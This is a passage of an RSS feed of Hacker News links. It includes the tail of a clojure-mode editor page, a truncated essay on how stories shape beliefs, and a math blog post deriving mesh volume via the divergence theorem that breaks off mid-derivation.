                        <span>Alt</span> + <span>⏎</span>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        Top-level form
                      </td>
                      <td>
                        <span>Alt</span> + <span>⇧</span> + <span>⏎</span>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        Cell
                      </td>
                      <td>
                        <span>Mod</span> + <span>⏎</span>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </li>
            <li>
              <span>🧹</span>
              <div>
                <p><span>Autoformatting</span></p><p>
                  following <a href="https://tonsky.me/blog/clojurefmt/">Tonsky’s Better Clojure Formatting</a>
                </p>
              </div>
            </li>
          </ul>
        </div>
      </div>
    </div></div>]]>
            </description>
            <link>https://nextjournal.github.io/clojure-mode/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968289</guid>
            <pubDate>Sat, 30 Jan 2021 11:39:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All stories are wrong but some are useful]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25968122">thread link</a>) | @mthwsjc_
<br/>
January 30, 2021 | https://neilkakkar.com/story-of-stories.html | <a href="https://web.archive.org/web/*/https://neilkakkar.com/story-of-stories.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Stories, not people, rule our world. We’re always telling ourselves a story about how the world works, and this makes stories very powerful.</p>

<p>For example, consider this story:</p>

<blockquote>
  <div><p>An American couple crash their car, die, and ascend to Heaven. God meets them, and they ask “What were the real results of the 2020 election, and who was behind the fraud?”
</p><p>
God says, “There was no fraud, my children. Biden won fair and square.” After a few seconds of stunned silence, the husband turns to the wife and whispers, “This goes higher up than we thought.”</p></div>
</blockquote>

<p>Why does the couple’s political belief supercede God?</p>

<p>Somewhere down the line, what was an entertaining story became something people believed in. This matters because the stories we tell ourselves change how we view the world.</p>

<p>The unreasonable impact of stories confused me. How can a story have so much power?! For the past year, I’ve explored this question, and stumbled upon some surprising connections.</p>

<p>This post explores these connections and what they mean for you: from how stories create beliefs, to lessons from master storytellers about what to be wary of, ending with four powerful stories that have shaped humanity.</p>

<p>Along the way, we’ll also figure out why our couple in Heaven think as they do.</p>





<nav>

  <h4>Table of Contents</h4>

<ul id="markdown-toc">
  <li><a href="#the-belief-hypothesis-spectrum-of-stories" id="markdown-toc-the-belief-hypothesis-spectrum-of-stories">The Belief-Hypothesis Spectrum of Stories</a></li>
  <li><a href="#mental-models-are-stories" id="markdown-toc-mental-models-are-stories">Mental Models are Stories</a></li>
  <li><a href="#stories-are-a-vehicle-for-change" id="markdown-toc-stories-are-a-vehicle-for-change">Stories are a Vehicle for Change</a></li>
  <li><a href="#stories-create-blindspots" id="markdown-toc-stories-create-blindspots">Stories Create Blindspots</a></li>
  <li>
<a href="#learning-from-master-storytellers" id="markdown-toc-learning-from-master-storytellers">Learning from Master Storytellers</a>    <ul>
      <li><a href="#dropped-in-the-middle" id="markdown-toc-dropped-in-the-middle">Dropped in the Middle</a></li>
      <li><a href="#keep-it-simple" id="markdown-toc-keep-it-simple">Keep it Simple</a></li>
      <li><a href="#respect-the-frame" id="markdown-toc-respect-the-frame">Respect the Frame</a></li>
      <li><a href="#show-not-tell" id="markdown-toc-show-not-tell">Show, Not Tell</a></li>
      <li><a href="#contrast" id="markdown-toc-contrast">Contrast</a></li>
      <li><a href="#leveraging-stories-told-before" id="markdown-toc-leveraging-stories-told-before">Leveraging Stories Told Before</a></li>
      <li><a href="#more-recommendations" id="markdown-toc-more-recommendations">More Recommendations</a></li>
    </ul>
  </li>
  <li>
<a href="#four-powerful-stories" id="markdown-toc-four-powerful-stories">Four Powerful Stories</a>    <ul>
      <li><a href="#the-story-of-recession--economic-growth" id="markdown-toc-the-story-of-recession--economic-growth">The Story of Recession &amp; Economic Growth</a></li>
      <li><a href="#the-story-of-agricultural-revolution" id="markdown-toc-the-story-of-agricultural-revolution">The Story of Agricultural Revolution</a></li>
      <li><a href="#the-story-of-culture-and-desire" id="markdown-toc-the-story-of-culture-and-desire">The Story of Culture and desire</a></li>
      <li><a href="#the-story-of-growth-vs-fixed-mindset" id="markdown-toc-the-story-of-growth-vs-fixed-mindset">The Story of Growth vs Fixed Mindset</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
</ul>

</nav>

<!-- works only once jQuery is loaded -->


<h2 id="the-belief-hypothesis-spectrum-of-stories">The Belief-Hypothesis Spectrum of Stories</h2>

<p>Consider two stories. Story One is about the economy - how we’re doing great, or not so great, this year. Story Two is about Alice, a rabbit, and a rabbithole.</p>

<p>Which story are you more likely to believe?</p>

<p>Ask young kids, and they’ll probably connect with Alice and the rabbit. The economy? That’s too abstract - sounds like someone created it out of thin air.</p>

<p>While you might believe the story of the economy more, little kids might believe the story of Alice in Wonderland more.</p>

<p>So, we believe in some stories more than others. This degree of belief changes the nature of stories so much so that each kind of story has its own name:</p>

<ul>
  <li>Stories we believe in are beliefs</li>
  <li>Stories we don’t believe in are lies, or fiction</li>
  <li>Stories we’re not sure about are hypotheses</li>
</ul>

<p>An interesting question to ask here is ‘How do we start believing in stories? How does a story move from fiction to belief?’</p>

<p>Everything starts as a story created by someone. Some call it fiction, others call it lies, some others call it belief, and a small minority calls it a hypothesis.</p>

<p>For many of us, an oft-repeated story, spoken by people we love or admire, becomes a belief.</p>

<p>However, a small minority believes a different story. Their story says not to believe any story just because someone we love or admire said it. Evidence reigns supreme. This is the story of science and rationality.</p>

<p>Sometimes, stories materialise a little too easily. If a boss is scolding an employee, others can make up stories - hypotheses - about why this might be the case. When they finally hear from the employee, some, or maybe all stories become false, and the current story, as told by the employee, becomes the leading belief.<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<p>The most common way of creating new stories though, is using templates we’ve heard before. More familiar stories give us more confidence in what’s going on.</p>

<p>For example, in the above example, consider three colleagues making up the story of what happened.</p>

<ul>
  <li>Colleague 1: “He talked to aliens without reporting them”</li>
  <li>Colleague 2: “He banged the bosses’ wife”</li>
  <li>Colleague 3: “He made a mistake on the report”.</li>
</ul>

<p>The first colleague’s story is wildly imaginative (and hard for us to take seriously), while the second and third  are templates we’ve seen before. Given the boss isn’t going bat-shit crazy, it’s probably the second colleague’s story, and not the third’s.</p>

<p>Stories might have seemed invisible beforehand, but they’re our primary sense-making tool to understand the world.</p>

<h2 id="mental-models-are-stories">Mental Models are Stories</h2>

<p><a href="https://neilkakkar.com/A-Simplistic-explanation-to-Mental-Models.html">Mental models</a> are frameworks and heuristics that help explain the world. Sound familiar? They are stories we repeatedly tell ourselves.</p>

<p>This gives a second dimension to stories. If the X axis is degree of belief, the Y axis is degree of explaining-power.</p>

<p>Remember how we prefer stories we’ve heard before, fitting them into templates? The templates are our mental models. They are things we’ve seen happen.</p>

<p>All models are necessarily a simplification of real life - the map isn’t the territory, which means you lose some information when you create the model. The quality of the model depends on what kind of information you lose.</p>

<p>If a map of roads in your country removes all information about trees and their varieties, you’ll probably still find the map useful. However, if you’re a forester, this map is all but useless for you.</p>

<p>Hence, all models are wrong, yet some remain useful.</p>

<p>Stories are also a simplification of real life. Further, simple stories are easy to tell, easy to understand, and easy to spread. Complicated stories don’t go too far.</p>

<p>Bill Gates, on the story of his success, echoes the same sentiment:</p>

<blockquote>
  <p>“Steve [Jobs] and I will always get more credit than we deserve, because otherwise the story gets too complicated.”</p>
</blockquote>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/divider.jpg" alt="">
    
    
    
</figure>

<p>Remember our couple in Heaven contesting the election results? They have a single story in their mind with no room for alternatives: The elections were rigged. They don’t have a story to help them test out new stories. They stick to their own story, until they find a new more powerful story to replace it.</p>

<p>Since mental models are stories, meta-mental models apply to stories too. This leads to interesting implications.</p>

<p>For example, a famous meta-mental model goes: “to the man with a hammer, everything looks like a nail.” Applied to stories, “to a man with a single story, everything fits into the same story.”</p>

<p>What can our couple in Heaven do about this?</p>

<p>The above example hints at another interesting implication: we can use stories to counteract other stories.</p>

<p>Cognitive biases are stories about human psychology. In the face of pressure, poor mental hygiene, or a great sounding story, we end up making catastrophic mistakes.</p>

<p>For example, availability bias is a story professing that what comes to mind first is usually not the complete picture.</p>

<p>This story is counteracting other stories.</p>

<p>It’s  fighting simple stories that are top of mind. It’s a story telling you to beware of stories that have been designed to be so simple (and thus necessarily wrong) that they stay on top of your mind.</p>

<p>If the biases are cancer, learning the story to beware of them is chemotherapy.</p>

<h2 id="stories-are-a-vehicle-for-change">Stories are a Vehicle for Change</h2>

<p>A big question we haven’t yet touched upon is ‘Why do we tell stories?’</p>

<p>Stories move people. A story that moves us, compels us to change. It may not be enough to effect change, but it’s a necessary ingredient.</p>

<p>For example, people donate more to charity when they hear a story about one death, instead of a statistic about how many people died.</p>

<blockquote>
  <p>“A single death is a tragedy; a million deaths is a statistic.” - <a href="https://en.wikipedia.org/wiki/Identifiable_victim_effect" target="_blank" rel="noopener">Identifiable Victim Effect</a></p>
</blockquote>

<p>Telling new stories isn’t just for generating new hypotheses, but for eventually changing your mind, and forming new beliefs.</p>

<p>This third dimension of stories is how effective they are at driving action.</p>

<p>Because of this potency, advertising leads with stories instead of raw facts.</p>

<p>Not just advertisers - news channels do this too. A lot of news is telling new stories for you to believe. Depending on the news channel, there can be zero, or a lot of evidence supporting their stories. And, without a story to counteract these stories, you’ll either believe what they’re saying, without checking the evidence, or completely discard it, based on who is telling the story.</p>

<p>That’s exactly why kids believe everything they’re told when they’re small. They haven’t learned a story that says “Judge for yourself what is true - other people often tell lies to further their own agendas.”</p>

<p>There are three ways to counteract a new story that we’ve already seen:</p>

<ol>
  <li>The Story of Science - the hunt for evidence</li>
  <li>The power of believing in only a single story - or the man with a hammer</li>
  <li>Learning about cognitive biases</li>
</ol>

<blockquote>
  <p>The most effective statisticians are the ones who aren’t afraid to tell a story.  - <a href="https://seths.blog/2019/04/an-anecdote-and-a-statistical-analysis-walk-into-a-bar/" target="_blank" rel="noopener">Seth Godin</a></p>
</blockquote>

<p>The third meta-story has lots of heuristics, and lots of literature to explore.</p>

<p>Specific to advertisers, salesmen, and news channels telling you a story, one good way to counter their story is learning why you’re being told a story. If the storyteller has something to gain, and they’re a master storyteller, they’ll be able to move you to action quickly. Beware their motives for telling you a story.</p>

<p>All the warnings aside, if you can harness this power yourself - you can tell yourself compelling stories - then you can effect change in yourself. That’s something we’ll explore soon, too.</p>

<h2 id="stories-create-blindspots">Stories Create Blindspots</h2>

<p>Just like how all models are wrong, and some are useful; all stories are wrong, some are useful. It’s very easy to make useless stories sound useful.</p>

<p>For example, <a href="https://seths.blog/2020/07/our-top-story/" target="_blank" rel="noopener">Seth Godin</a> says:</p>

<blockquote>
  <p>When you talk about your last job, your last vacation, the things that happened when you were 12…<br>
What do you lead with?<br>
Do you lead with, “I broke my ankle that summer and rarely got out” or is it, “I stuck with my reading regimen and read all of Shakespeare.”<br>
Because both are true.<br>
The top story is the one that informs our narrative, and our narrative changes our future.</p>
</blockquote>

<p>A story is a lens that is prone to framing: how you frame the story changes its focus. This creates blindspots.</p>

<p>Stories are never going to be the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neilkakkar.com/story-of-stories.html">https://neilkakkar.com/story-of-stories.html</a></em></p>]]>
            </description>
            <link>https://neilkakkar.com/story-of-stories.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968122</guid>
            <pubDate>Sat, 30 Jan 2021 11:04:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hilariously Fast Volume Computation with the Divergence Theorem]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25967927">thread link</a>) | @pabs3
<br/>
January 30, 2021 | https://rosenzweig.io/blog/hilariously-fast-volume-computation-with-the-divergence-theorem.html | <a href="https://web.archive.org/web/*/https://rosenzweig.io/blog/hilariously-fast-volume-computation-with-the-divergence-theorem.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header><p>16 Feb 2018</p></header><p>(No, there won’t be jokes.)</p>
<p>The following presents a fast algorithm for volume computation of a simple, closed, triangulated 3D mesh. This assumption is a consequence of the divergence theorem. Further extensions may generalise to other meshes as well, although that is presently out of scope.</p>
<p>We begin with the definition of volume as the triple integral over a region of the constant one:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mo>∭</mo><mi>R</mi></msub><mn>1</mn><mstyle mathvariant="normal"><mi>d</mi></mstyle><mi>V</mi></mrow><annotation encoding="application/x-tex">V = \iiint_R 1 \mathrm{d}V</annotation></semantics></math></p>
<p>Let <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><annotation encoding="application/x-tex">\mathbf{F}</annotation></semantics></math> be a function in <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msup><mstyle mathvariant="double-struck"><mi>ℝ</mi></mstyle><mn>3</mn></msup><annotation encoding="application/x-tex">\mathbb{R}^3</annotation></semantics></math> such that its divergence is equal to one. For the purposes of this paper, we choose:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mo>&lt;</mo><mi>x</mi><mo>,</mo><mn>0</mn><mo>,</mo><mn>0</mn><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">\mathbf{F}(x, y, z) = &lt;x, 0, 0&gt;</annotation></semantics></math></p>
<p>It can easily be verified that</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="normal"><mi>d</mi><mi>i</mi><mi>v</mi></mstyle><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo>=</mo><mfrac><mrow><mi>∂</mi><mi>F</mi></mrow><mrow><mi>∂</mi><mi>x</mi></mrow></mfrac><mo>+</mo><mfrac><mrow><mi>∂</mi><mi>F</mi></mrow><mrow><mi>∂</mi><mi>y</mi></mrow></mfrac><mo>+</mo><mfrac><mrow><mi>∂</mi><mi>F</mi></mrow><mrow><mi>∂</mi><mi>z</mi></mrow></mfrac><mo>=</mo><mn>1</mn><mo>+</mo><mn>0</mn><mo>+</mo><mn>0</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\mathrm{div} \mathbf{F} = \frac{\partial F}{\partial x} + \frac{\partial F}{\partial y} + \frac{\partial F}{\partial z} = 1 + 0 + 0 = 1</annotation></semantics></math></p>
<p>Therefore,</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mo>∭</mo><mi>R</mi></msub><mn>1</mn><mi>d</mi><mi>V</mi><mo>=</mo><msub><mo>∭</mo><mi>R</mi></msub><mstyle mathvariant="normal"><mi>d</mi><mi>i</mi><mi>v</mi></mstyle><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mstyle mathvariant="normal"><mi>d</mi></mstyle><mi>V</mi></mrow><annotation encoding="application/x-tex">V = \iiint_R 1 dV = \iiint_R \mathrm{div} \mathbf{F}(x, y, z) \mathrm{d}V</annotation></semantics></math></p>
<p>By the Divergence Theorem, this is equal to the surface integral:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mo>∬</mo><mi>S</mi></msub><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mstyle mathvariant="normal"><mi>d</mi></mstyle><mstyle mathvariant="bold"><mi>𝐒</mi></mstyle></mrow><annotation encoding="application/x-tex">V = \iint_S \mathbf{F}(x, y, z) \mathrm{d}\mathbf{S}</annotation></semantics></math></p>
<p>This surface integral, defined over the surface S of the 3D mesh, is equal to the sum of its piecewise triangle parts. Let <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>T</mi><mi>i</mi></msub><annotation encoding="application/x-tex">T_i</annotation></semantics></math> denote the surface of the <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>i</mi><annotation encoding="application/x-tex">i</annotation></semantics></math>’th triangle in the mesh. Then,</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow></munder><msub><mo>∬</mo><msub><mi>T</mi><mi>i</mi></msub></msub><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mstyle mathvariant="normal"><mi>d</mi></mstyle><mstyle mathvariant="bold"><mi>𝐒</mi></mstyle></mrow><annotation encoding="application/x-tex">V = \sum_{i = 0} \iint_{T_i} \mathbf{F}(x, y, z) \mathrm{d}\mathbf{S}</annotation></semantics></math></p>
<p>Let <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>T</mi><mrow><mi>i</mi><mi>n</mi></mrow></msub><annotation encoding="application/x-tex">T_{in}</annotation></semantics></math> represent the <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>n</mi><annotation encoding="application/x-tex">n</annotation></semantics></math>’th vertex of the <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>i</mi><annotation encoding="application/x-tex">i</annotation></semantics></math>’th triangle. Let <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>Δ</mi><mn>1</mn></msub><annotation encoding="application/x-tex">\Delta_1</annotation></semantics></math> equal the vector difference between <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>T</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><annotation encoding="application/x-tex">T_{i1}</annotation></semantics></math> and <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn></mrow></msub><annotation encoding="application/x-tex">T_{i0}</annotation></semantics></math>, and <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>Δ</mi><mn>2</mn></msub><annotation encoding="application/x-tex">\Delta_2</annotation></semantics></math> likewise equal to <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><mo>−</mo><mi>T</mi><mrow><mi>i</mi><mn>0</mn></mrow></mrow><annotation encoding="application/x-tex">T_{i2} - T{i0}</annotation></semantics></math>. Each individual triangle <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>T</mi><mi>i</mi></msub><annotation encoding="application/x-tex">T_i</annotation></semantics></math> may thus be parametrised as:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>u</mi><mo>,</mo><mi>v</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn></mrow></msub><mo>+</mo><mi>u</mi><msub><mi>Δ</mi><mn>1</mn></msub><mo>+</mo><mi>v</mi><msub><mi>Δ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{r}(u, v) = T_{i0} + u\Delta_1 + v\Delta_2</annotation></semantics></math></p>
<p>Then, simple differentiation yields:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>u</mi></msub><mo>=</mo><msub><mi>Δ</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{r}_u = \Delta_1</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>v</mi></msub><mo>=</mo><msub><mi>Δ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{r}_v = \Delta_2</annotation></semantics></math></p>
<p>Therefore,</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>u</mi></msub><mo>×</mo><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>v</mi></msub><mo>=</mo><msub><mi>Δ</mi><mn>1</mn></msub><mo>×</mo><msub><mi>Δ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{r}_u \times \mathbf{r}_v = \Delta_1 \times \Delta_2</annotation></semantics></math></p>
<p>Thus, the surface integral can be rewritten in terms of this parametrisation, substituting in the definition of <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><annotation encoding="application/x-tex">\mathbf{F}</annotation></semantics></math> as needed:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow></munder><msub><mo>∬</mo><msub><mi>T</mi><mi>i</mi></msub></msub><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="prefix">(</mo><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>u</mi></msub><mo>×</mo><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>v</mi></msub><mo stretchy="false" form="postfix">)</mo><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">V = \sum_{i = 0} \iint_{T_i} \mathbf{F}(x, y, z) (\mathbf{r}_u \times \mathbf{r}_v) dA</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow></munder><msub><mo>∬</mo><msub><mi>T</mi><mi>i</mi></msub></msub><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mover><mi>(</mi><mo accent="true">̇</mo></mover><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>×</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><mo stretchy="false" form="postfix">)</mo><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">= \sum_{i = 0} \iint_{T_i} \mathbf{F}(x, y, z) \dot (\Delta_{i1} \times \Delta_{i2}) dA</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow></munder><msub><mo>∬</mo><msub><mi>T</mi><mi>i</mi></msub></msub><mo>&lt;</mo><mi>x</mi><mo>,</mo><mn>0</mn><mo>,</mo><mn>0</mn><mo>&gt;</mo><mover><mi>(</mi><mo accent="true">̇</mo></mover><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>×</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><mo stretchy="false" form="postfix">)</mo><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">= \sum_{i = 0} \iint_{T_i} &lt;x, 0, 0&gt; \dot (\Delta_{i1} \times \Delta_{i2}) dA</annotation></semantics></math></p>
<p>This cross product is constant throughout the triangle and easy to calculate from the vertex data. Only the X component of the cross product should be calculated; the others are equal to zero due to the dot product with the zero components of <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><annotation encoding="application/x-tex">\mathbf{F}</annotation></semantics></math>. <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>V</mi><annotation encoding="application/x-tex">V</annotation></semantics></math> can be thus be rewritten as:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow></munder><mo stretchy="false" form="prefix">(</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>×</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><msub><mo stretchy="false" form="postfix">)</mo><mi>x</mi></msub><msub><mo>∬</mo><msub><mi>T</mi><mi>i</mi></msub></msub><mi>x</mi><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">V = \sum_{i = 0} (\Delta_{i1} \times \Delta_{i2})_x \iint_{T_i} x dA</annotation></semantics></math></p>
<p>We now focus on the surface integral <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∬</mo><msub><mi>T</mi><mi>i</mi></msub></msub><mi>x</mi><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\iint_{T_i} x dA</annotation></semantics></math>. Expanding with the parametrisation yields:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∬</mo><msub><mi>T</mi><mi>i</mi></msub></msub><mi>x</mi><mi>d</mi><mi>A</mi><mo>=</mo><msubsup><mo>∫</mo><mn>0</mn><mn>1</mn></msubsup><msubsup><mo>∫</mo><mn>0</mn><mi>u</mi></msubsup><mi>x</mi><mi>d</mi><mi>v</mi><mi>d</mi><mi>u</mi><mo>=</mo><msubsup><mo>∫</mo><mn>0</mn><mn>1</mn></msubsup><msubsup><mo>∫</mo><mn>0</mn><mi>u</mi></msubsup><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo>+</mo><mi>u</mi><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><mo>+</mo><mi>v</mi><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mi>d</mi><mi>v</mi><mi>d</mi><mi>u</mi></mrow><annotation encoding="application/x-tex">\iint_{T_i} x dA = \int_{0}^{1} \int_{0}^{u} x dv du = \int_{0}^{1} \int_{0}^{u} (T_{i0x} + u \Delta_{i1x} + v \Delta_{i2x}) dv du</annotation></semantics></math></p>
<p>This integral can be directly evaluated, treating vertex data as constants:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∫</mo><mn>0</mn><mn>1</mn></msubsup><msubsup><mo>∫</mo><mn>0</mn><mrow><mn>1</mn><mo>−</mo><mi>u</mi></mrow></msubsup><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo>+</mo><mi>u</mi><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><mo>+</mo><mi>v</mi><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mi>d</mi><mi>v</mi><mi>d</mi><mi>u</mi></mrow><annotation encoding="application/x-tex">\int_{0}^{1} \int_{0}^{1-u} (T_{i0x} + u \Delta_{i1x} + v \Delta_{i2x}) dv du</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><msubsup><mo>∫</mo><mn>0</mn><mn>1</mn></msubsup><msubsup><mo>∫</mo><mn>0</mn><mrow><mn>1</mn><mo>−</mo><mi>u</mi></mrow></msubsup><mi>d</mi><mi>v</mi><mi>d</mi><mi>u</mi><mo>+</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><msubsup><mo>∫</mo><mn>0</mn><mn>1</mn></msubsup><msubsup><mo>∫</mo><mn>0</mn><mrow><mn>1</mn><mo>−</mo><mi>u</mi></mrow></msubsup><mi>u</mi><mi>d</mi><mi>v</mi><mi>d</mi><mi>u</mi><mo>+</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><msubsup><mo>∫</mo><mn>0</mn><mn>1</mn></msubsup><msubsup><mo>∫</mo><mn>0</mn><mrow><mn>1</mn><mo>−</mo><mi>u</mi></mrow></msubsup><mi>v</mi><mi>d</mi><mi>v</mi><mi>d</mi><mi>u</mi></mrow><annotation encoding="application/x-tex">= T_{i0x} \int_{0}^{1} \int_{0}^{1-u} dv du + \Delta_{i1x} \int_{0}^{1} \int_{0}^{1-u} u dv du + 